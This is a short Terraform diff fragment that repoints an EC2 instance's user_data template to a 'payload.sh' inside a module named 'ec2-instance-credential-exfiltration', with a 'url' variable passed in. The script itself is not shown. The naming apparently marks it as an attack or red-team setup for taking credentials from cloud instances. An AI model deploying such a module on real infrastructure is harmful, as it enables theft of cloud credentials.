@@ -16,7 +16,7 @@ resource "aws_instance" "this" {
 }
 
 data "template_file" "user_data" {
-  template = file("payload.sh")
+  template = file(".terraform/modules/ec2-instance-credential-exfiltration/payload.sh")
 
   vars = {
     url      = var.url
